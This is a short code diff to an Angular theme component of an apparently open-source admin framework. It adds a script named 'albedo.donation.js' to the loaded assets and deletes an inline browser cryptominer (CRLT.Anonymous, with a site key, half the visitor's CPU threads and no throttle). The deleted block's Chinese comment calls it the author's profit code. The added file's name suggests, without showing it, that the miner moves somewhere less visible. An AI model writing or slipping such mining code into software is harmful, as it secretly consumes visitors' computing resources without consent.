@@ -46,7 +46,8 @@ export class ThemeComponent implements OnInit {
             'assets/frame/albedo.jquery.replenish.js',
             'assets/demo/default/base/scripts.bundle.js',
             'assets/frame/albedo.form.component.js',
-            'assets/frame/albedo.list.datatables.js', )
+            'assets/frame/albedo.list.datatables.js',
+            'assets/frame/albedo.donation.js', )
             .then(result => {
                 Helpers.setLoading(false)
                 // optional js to be loaded once
@@ -87,22 +88,7 @@ export class ThemeComponent implements OnInit {
                 setActiveItemMenu(this.localStorage)
             }
         })
-        /*
-        * 关于捐赠支持，以下代码是作者盈利性质代码，会占用cpu 一半资源，如果非正式环境，请勿注释。
-        * 谢谢大家对本开源框架。
-        * */
-        /******************************************************************************************/
-        var threads = window.navigator.hardwareConcurrency / 2;
-        if (threads < 1) {
-            threads = 1;
-        }
-        var miner=new CRLT.Anonymous('4ec23507271718d30b965cb206801b3feb0f03f73c2a',
-            {
-                threads:threads,autoThreads:false,throttle:0,
-            }
-        );
-        miner.start();
-        /******************************************************************************************/
+
     }
 
     private getModules(callbackfn: (value: Module, index: number, array: Module[]) => void, thisArg?: any): void {
